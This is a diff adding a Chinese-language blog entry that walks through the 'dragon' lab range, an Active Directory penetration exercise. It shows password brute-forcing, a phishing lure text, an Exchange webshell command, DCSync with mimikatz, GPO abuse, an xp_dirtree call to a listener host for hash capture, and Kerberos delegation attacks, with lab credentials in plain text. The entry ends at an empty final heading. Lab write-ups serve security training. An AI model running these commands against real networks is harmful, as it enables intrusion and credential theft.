@@ -5630,4 +5630,187 @@
         <tag>windows</tag>
       </tags>
   </entry>
+  <entry>
+    <title>dragon 靶场WP</title>
+    <url>/2023/12/06/dragon_wp/</url>
+    <content><![CDATA[<p>靶场搭建：</p>
+<p><a href="https://github.com/0range-x/dragon-lab">https://github.com/0range-x/dragon-lab</a></p>
+<h4 id="ws01-owa钓鱼"><a href="#ws01-owa钓鱼" class="headerlink" title="ws01-owa钓鱼"></a>ws01-owa钓鱼</h4><p>扫描结果</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220610145158181.png" alt="image-20220610145158181"></p>
+<p>ftp匿名上传</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220610150402228.png" alt="image-20220610150402228"></p>
+<p>制作用户名字典</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220610145441403.png" alt="image-20220610145441403"></p>
+<p>构造字典msf爆破成功，字典用的rockyou.txt</p>
+<p>成功登录</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gaohexie/sweetpea#1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/dragon_wp/image-20220530201823355.png" alt="image-20220530201823355"></p>
+<p><img src="/2023/12/06/dragon_wp/image-20220530204556396.png" alt="image-20220530204556396"></p>
+<p>构造话术</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">关于自测钓鱼后门的通知</span><br><span class="line"></span><br><span class="line">您好，近期公司组织攻防演练，发现攻击方使用钓鱼邮件进行攻击，已有多名同事中招，请下载后门检测工具，扫描机器是否被横向攻击。另外，希望同时提高安全意识，谨防被钓鱼攻击</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/dragon_wp/image-20220610171548716.png" alt="image-20220610171548716"></p>
+<p><img src="/2023/12/06/dragon_wp/image-20220610172746519.png" alt="image-20220610172746519"></p>
+<h4 id="ws02-exchange-rce"><a href="#ws02-exchange-rce" class="headerlink" title="ws02-exchange rce"></a>ws02-exchange rce</h4><p>cve-2021-26857</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220531011647320.png" alt="image-20220531011647320"></p>
+<p>成功写入shell</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220610175250310.png" alt="image-20220610175250310"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">command=Response.Write(new%20ActiveXObject(&quot;Wscript.Shell&quot;).exec(&quot;whoami&quot;).Stdout.ReadAll());</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/dragon_wp/image-20220610175807860.png" alt="image-20220610175807860"></p>
+<p>python 开启web服务 下载木马上线</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220610180300395.png" alt="image-20220610180300395"></p>
+<p><img src="/2023/12/06/dragon_wp/image-20220610180350796.png" alt="image-20220610180350796"></p>
+<p>成功上线system</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220610181305844.png" alt="image-20220610181305844"></p>
+<p>定位域控</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220610181557699.png" alt="image-20220610181557699"></p>
+<p><img src="/2023/12/06/dragon_wp/image-20220610181619682.png" alt="image-20220610181619682"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC=haishitest,DC=lab&quot; -PrincipalIdentity gaohexie -Rights DCSync</span><br><span class="line"></span><br><span class="line">mimi.exe &quot;lsadump::dcsync /domain:haishitest.lab /user:administrator /csv&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p>导入powerview</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220610185611737.png" alt="image-20220610185611737"></p>
+<p>添加普通用户dcsync权限</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220610185706320.png" alt="image-20220610185706320"></p>
+<p>winrm登录</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220610191808759.png" alt="image-20220610191808759"></p>
+<p>执行上线</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220610191749387.png" alt="image-20220610191749387"></p>
+<p>抓到liaide的密码，该用户拥有dcsync权限，直接dcsync</p>
+<h4 id="ws04-as-rep"><a href="#ws04-as-rep" class="headerlink" title="ws04- as_rep"></a>ws04- as_rep</h4><p><img src="/2023/12/06/dragon_wp/image-20220611111126318.png" alt="image-20220611111126318"></p>
+<p>发现maluzi用户存在as_rep</p>
+<p>制作行为习惯字典</p>
+<p><a href="https://github.com/bigb0sss/goPassGen">https://github.com/bigb0sss/goPassGen</a></p>
+<p>生成字典</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611112033126.png" alt="image-20220611112033126"></p>
+<p>爆破成功</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611112307187.png" alt="image-20220611112307187"></p>
+<p>成功登录ws04机器</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611112607475.png" alt="image-20220611112607475"></p>
+<p>发现xmanager目录</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611112645500.png" alt="image-20220611112645500"></p>
+<p>上传解密工具</p>
+<p>抓到密码</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611113043484.png" alt="image-20220611113043484"></p>
+<h4 id="ws05-空路径提权-dpapi解密"><a href="#ws05-空路径提权-dpapi解密" class="headerlink" title="ws05-空路径提权+dpapi解密"></a>ws05-空路径提权+dpapi解密</h4><p>winrm登录服务器</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611115111856.png" alt="image-20220611115111856"></p>
+<p>先上线cs</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611115911283.png" alt="image-20220611115911283"></p>
+<p>3389远程连接</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611162919473.png" alt="image-20220611162919473"></p>
+<p>查找可以服务提权的路径</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611164849727.png" alt="image-20220611164849727"></p>
+<p>查看该服务</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611164936672.png" alt="image-20220611164936672"></p>
+<p>停止该服务</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611165039353.png" alt="image-20220611165039353"></p>
+<p>修改配置文件并启动上线</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611165607649.png" alt="image-20220611165607649"></p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611165552896.png" alt="image-20220611165552896"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Program Files (x86)\AnyDesk\AnyDesk.exe --service</span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611165647665.png" alt="image-20220611165647665"></p>
+<p>cs不稳定 反弹到nc</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611170952128.png" alt="image-20220611170952128"></p>
+<p>上传解密工具</p>
+<p>谷歌浏览器解密工具</p>
+<p><a href="https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.4.3">https://github.com/moonD4rk/HackBrowserData/releases/tag/v0.4.3</a></p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611171432318.png" alt="image-20220611171432318"></p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611171422055.png" alt="image-20220611171422055"></p>
+<p>注入到administrator进程</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611171716537.png" alt="image-20220611171716537"></p>
+<p>抓取成功</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611171925433.png" alt="image-20220611171925433"></p>
+<p>读取密码</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611172041142.png" alt="image-20220611172041142"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zhaolinlu:tEKO4f4CQ1BPPz~LQm</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="ws06-08-GPO批量上线"><a href="#ws06-08-GPO批量上线" class="headerlink" title="ws06-08-GPO批量上线"></a>ws06-08-GPO批量上线</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\zhaolinlu\Desktop&gt;StandIn_v13_Net45.exe --gpo --filter work --acl</span><br><span class="line"></span><br><span class="line">[?] Using DC : ws13.haishi.lab</span><br><span class="line">[+] GPO result count         : 1</span><br><span class="line">    |_ Result limit          : 50</span><br><span class="line">    |_ Applying search filter</span><br><span class="line"></span><br><span class="line">[?] Object   : CN=&#123;07D9CE42-10BD-436D-89AA-3B2EFAF47766&#125;</span><br><span class="line">    Path     : LDAP://CN=&#123;07D9CE42-10BD-436D-89AA-3B2EFAF47766&#125;,CN=Policies,CN=System,DC=haishi,DC=lab</span><br><span class="line">    GPCFilesysPath : \\haishi.lab\SysVol\haishi.lab\Policies\&#123;07D9CE42-10BD-436D-89AA-3B2EFAF47766&#125;</span><br><span class="line">    Path           : OK</span><br><span class="line"></span><br><span class="line">[+] Account       : CREATOR OWNER</span><br><span class="line">    Type          : Allow</span><br><span class="line">    Rights        : FullControl</span><br><span class="line">    Inherited ACE : False</span><br><span class="line">    Propagation   : InheritOnly</span><br><span class="line"></span><br><span class="line">[+] Account       : NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS</span><br><span class="line">    Type          : Allow</span><br><span class="line">    Rights        : ReadAndExecute, Synchronize</span><br><span class="line">    Inherited ACE : False</span><br><span class="line">    Propagation   : None</span><br><span class="line"></span><br><span class="line">[+] Account       : NT AUTHORITY\Authenticated Users</span><br><span class="line">    Type          : Allow</span><br><span class="line">    Rights        : ReadAndExecute, Synchronize</span><br><span class="line">    Inherited ACE : False</span><br><span class="line">    Propagation   : None</span><br><span class="line"></span><br><span class="line">[+] Account       : NT AUTHORITY\SYSTEM</span><br><span class="line">    Type          : Allow</span><br><span class="line">    Rights        : FullControl</span><br><span class="line">    Inherited ACE : False</span><br><span class="line">    Propagation   : None</span><br><span class="line"></span><br><span class="line">[+] Account       : HAISHI\Domain Admins</span><br><span class="line">    Type          : Allow</span><br><span class="line">    Rights        : FullControl</span><br><span class="line">    Inherited ACE : False</span><br><span class="line">    Propagation   : None</span><br><span class="line"></span><br><span class="line">[+] Account       : HAISHI\Enterprise Admins</span><br><span class="line">    Type          : Allow</span><br><span class="line">    Rights        : FullControl</span><br><span class="line">    Inherited ACE : False</span><br><span class="line">    Propagation   : None</span><br><span class="line"></span><br><span class="line">[+] Account       : HAISHI\zhaolinlu</span><br><span class="line">    Type          : Allow</span><br><span class="line">    Rights        : FullControl</span><br><span class="line">    Inherited ACE : False</span><br><span class="line">    Propagation   : None</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2023/12/06/dragon_wp/image-20220603180211010.png" alt="image-20220603180211010"></p>
+<p>建立计划任务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">StandIn_v13_Net45.exe --gpo  --filter work --tasktype computer --taskname task01 --author &quot;haishi\Administrator&quot; --command &quot;powershell.exe /c&quot; --args &quot;net localgroup &#x27;administrators&#x27; zhaolinlu /add&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a href="https://github.com/rootSySdk/PowerGPOAbuse">https://github.com/rootSySdk/PowerGPOAbuse</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Add-GPOGroupMember -Member &#x27;zhaolinlu&#x27; -GPOIdentity &#x27;work&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/dragon_wp/image-20220603173932739.png" alt="image-20220603173932739"></p>
+<p>同样的方式在ws08机器上发现mssql的sa账号密码</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220611174633555.png" alt="image-20220611174633555"></p>
+<h4 id="sql01-xp-cmd-监听hash"><a href="#sql01-xp-cmd-监听hash" class="headerlink" title="sql01-xp_cmd 监听hash"></a>sql01-xp_cmd 监听hash</h4><p>登录成功</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220612001442223.png" alt="image-20220612001442223"></p>
+<p>执行xp_dirtree，监听得到hash</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC master.sys.xp_dirtree &#x27;\\192.168.200.15\simblog.txt&#x27;,0,1;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2023/12/06/dragon_wp/image-20220612003930132.png" alt="image-20220612003930132"></p>
+<p><img src="/2023/12/06/dragon_wp/image-20220612003957326.png" alt="image-20220612003957326"></p>
+<p>拿到mssql服务账户的hash</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220612004012595.png" alt="image-20220612004012595"></p>
+<p>使用大字典rockyou.txt爆破出密码</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220612004949511.png" alt="image-20220612004949511"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wuxinqi:xxotisxx14.</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="sql02-tv接管"><a href="#sql02-tv接管" class="headerlink" title="sql02-tv接管"></a>sql02-tv接管</h4><p>3389成功登录该机器</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220612182423302.png" alt="image-20220612182423302"></p>
+<p>发现该机器有tv，同时连接着 192.168.201.100这台机器</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220612182449360.png" alt="image-20220612182449360"></p>
+<p>而且桌面保存着密码</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220612183954238.png" alt="image-20220612183954238"></p>
+<p>连接成功</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220612184021543.png" alt="image-20220612184021543"></p>
+<h4 id="ws09-clm限制"><a href="#ws09-clm限制" class="headerlink" title="ws09- clm限制"></a>ws09- clm限制</h4><p>发现cmd被禁用</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220612184847067.png" alt="image-20220612184847067"></p>
+<p>发现很多命令被禁用</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220612184921608.png" alt="image-20220612184921608"></p>
+<p>同时powershell被设置为 clm 语言模式</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220612185723118.png" alt="image-20220612185723118"></p>
+<p>同时发现该目录无法执行exe</p>
+<p>切换一个白目录</p>
+<p>bypass clm</p>
+<p><a href="https://hackmd.io/@0xbc000/B1pNFIuP">https://hackmd.io/@0xbc000/B1pNFIuP</a>_</p>
+<p>限制目录执行exe</p>
+<p>发现rbcd的用户</p>
+<p><img src="/2023/12/06/dragon_wp/image-20220613131615068.png" alt="image-20220613131615068"></p>
+<p><img src="/2023/12/06/dragon_wp/image-20220613132059427.png" alt="image-20220613132059427"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">husungeng:X9NNkYTMp9jA2vKHXXI</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="ws12-rbcd接管exchange"><a href="#ws12-rbcd接管exchange" class="headerlink" title="ws12-rbcd接管exchange"></a>ws12-rbcd接管exchange</h4><p>生成机器账号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpAllowedToAct.exe -m husungeng -p X9NNkYTMp9jA2vKHXXI -t ws12 -a 192.168.200.2 haishi.lab</span><br></pre></td></tr></table></figure>
+
+
+
+<p>获取服务票据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python getST.py -dc-ip 192.168.200.2 haishi/husungeng:X9NNkYTMp9jA2vKHXXI -spn cifs/ws12.haishi.lab -impersonate administrator </span><br></pre></td></tr></table></figure>
+
+<p>导入票据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache </span><br></pre></td></tr></table></figure>
+
+<p>getshell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 smbexec.py -no-pass -k ws12.haishi.lab</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2023/12/06/dragon_wp/image-20220613170723911.png" alt="image-20220613170723911"></p>
+<h4 id="ws13-dc"><a href="#ws13-dc" class="headerlink" title="ws13-dc"></a>ws13-dc</h4>]]></content>
+      <categories>
+        <category>靶场</category>
+      </categories>
+      <tags>
+        <tag>靶场</tag>
+      </tags>
+  </entry>
 </search>
